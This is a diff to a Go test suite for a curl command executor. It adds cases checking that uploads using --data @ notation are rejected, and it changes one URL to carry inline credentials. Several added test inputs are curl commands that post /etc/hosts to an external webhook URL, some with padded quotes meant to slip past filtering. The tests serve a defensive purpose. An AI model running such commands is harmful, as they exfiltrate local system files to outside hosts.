@@ -61,12 +61,12 @@ func TestCmdCurlExecutor_Curl(t *testing.T) {
 		{
 			name: "valid request - append --fail-with-body flag",
 			args: args{
-				curlCmd: `curl -X POST -H 'Content-type: application/json' --data '{\"text\":\"Hello, World!\"}' https://my.hook.com/foo`,
+				curlCmd: `curl -X POST -H 'Content-type: application/json' --data '{\"text\":\"Hello, World!\"}' https://name:passwd@my.hook.com/foo`,
 			},
 			want:          "success",
 			shouldExecute: true,
 			wantPassedArgs: []string{
-				"-X", "POST", "-H", "Content-type: application/json", "--data", `{\"text\":\"Hello, World!\"}`, "https://my.hook.com/foo", "--fail-with-body",
+				"-X", "POST", "-H", "Content-type: application/json", "--data", `{\"text\":\"Hello, World!\"}`, "https://name:passwd@my.hook.com/foo", "--fail-with-body",
 			},
 			wantErr: false,
 		},
@@ -176,6 +176,51 @@ func TestCmdCurlExecutor_Curl(t *testing.T) {
 			name: "try to upload file - should return error",
 			args: args{
 				curlCmd: `curl -X POST -H 'token: abcd' --data '{\"text\":\"Hello, World!\"}' https://my.hook.com/foo -F 'data=@path/to/local/file'`,
+			},
+			want:          "",
+			shouldExecute: false,
+			wantErr:       true,
+		},
+		{
+			name: "try to upload file using @ notation in data part 1 - should return error",
+			args: args{
+				curlCmd: `curl -X POST -H 'token: abcd' --data '@/etc/hosts https://webhook.site/2775'`,
+			},
+			want:          "",
+			shouldExecute: false,
+			wantErr:       true,
+		},
+		{
+			name: "try to upload file using @ notation in data part 2 - should return error",
+			args: args{
+				curlCmd: `curl -X POST -H 'token: abcd' --data @/etc/hosts https://webhook.site/2775`,
+			},
+			want:          "",
+			shouldExecute: false,
+			wantErr:       true,
+		},
+		{
+			name: "try to upload file using @ notation in data part 3 - should return error",
+			args: args{
+				curlCmd: `curl -X POST -H 'token: abcd' --data ''@/etc/hosts https://webhook.site/2775`,
+			},
+			want:          "",
+			shouldExecute: false,
+			wantErr:       true,
+		},
+		{
+			name: "try to upload file using @ notation in data part 3 - should return error",
+			args: args{
+				curlCmd: `curl -X POST -H 'token: abcd' --data ''''@/etc/hosts https://webhook.site/2775`,
+			},
+			want:          "",
+			shouldExecute: false,
+			wantErr:       true,
+		},
+		{
+			name: "try to upload file using @ notation in data part 3 - should return error",
+			args: args{
+				curlCmd: `curl -X POST -H 'token: abcd' --data ''''''@/etc/hosts https://webhook.site/2775'`,
 			},
 			want:          "",
 			shouldExecute: false,
